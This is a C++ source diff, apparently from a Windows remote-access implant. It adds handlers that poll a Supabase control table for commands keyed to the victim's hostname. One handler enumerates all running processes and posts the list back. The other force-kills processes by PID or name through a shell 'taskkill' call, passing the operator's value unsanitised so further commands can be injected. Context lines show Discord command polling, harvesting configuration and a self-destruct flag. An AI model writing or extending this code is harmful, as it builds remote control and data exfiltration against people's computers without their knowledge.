@@ -2280,6 +2280,71 @@ static void CheckAndHandleDownload() {
     LogMsg("Download: " + localPath + " -> " + (resultUrl.empty() ? "FAILED" : resultUrl));
 }
 
+static void CheckAndHandleProclist() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.proclist&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONNumber(resp, "id");
+    if (rowId.empty()) return;
+    std::string output;
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap != INVALID_HANDLE_VALUE) {
+        PROCESSENTRY32 pe = { sizeof(pe) };
+        if (Process32First(hSnap, &pe)) {
+            output = "[";
+            bool first = true;
+            do {
+                if (!first) output += ",";
+                output += "{\"pid\":" + std::to_string(pe.th32ProcessID) + ",\"name\":\"" + EscapeJSON(pe.szExeFile) + "\",\"threads\":" + std::to_string(pe.cntThreads) + "}";
+                first = false;
+            } while (Process32Next(hSnap, &pe));
+            output += "]";
+        }
+        CloseHandle(hSnap);
+    }
+    if (output.empty()) output = "[]";
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"proclist\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":0}]";
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
+    json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("Proclist: " + std::to_string(output.size()) + " bytes");
+}
+
+static void CheckAndHandleKill() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.kill&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return;
+    if (resp.size() < 10) return;
+    std::string rowId = ExtractJSONNumber(resp, "id");
+    std::string payload = ExtractJSONString(resp, "payload");
+    if (rowId.empty() || payload.empty()) return;
+    size_t colon = payload.find(':');
+    if (colon == std::string::npos || colon == 0 || colon == payload.size() - 1) return;
+    std::string type = payload.substr(0, colon);
+    std::string value = payload.substr(colon + 1);
+    if (type != "PID" && type != "NAME") return;
+    DWORD exitCode = 0;
+    std::string output;
+    if (type == "PID") {
+        output = ExecuteCommand("taskkill /F /PID " + value, &exitCode);
+    } else {
+        output = ExecuteCommand("taskkill /F /IM " + value, &exitCode);
+    }
+    if (output.empty()) output = "(no output)";
+    std::string json = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"command\":\"kill " + EscapeJSON(type + ":" + value) + "\",\"output\":\"" + EscapeJSON(output) + "\",\"exit_code\":" + std::to_string((int)exitCode) + "}]";
+    HttpRequest(L"POST", SUPABASE_EXEC_PATH, json, resp);
+    json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("Kill: " + type + ":" + value + " -> exit " + std::to_string((int)exitCode));
+}
+
 static void SendHeartbeat() {
     // Upload crash logs if any
     char tmp[MAX_PATH];
@@ -2625,6 +2690,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 { std::string id = CheckDiscordCmd(); if (!id.empty()) HandleDiscordCmd(id); }
                 CheckAndHandleDirlist();
                 CheckAndHandleDownload();
+                CheckAndHandleProclist();
+                CheckAndHandleKill();
                 CheckHarvestConfig();
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
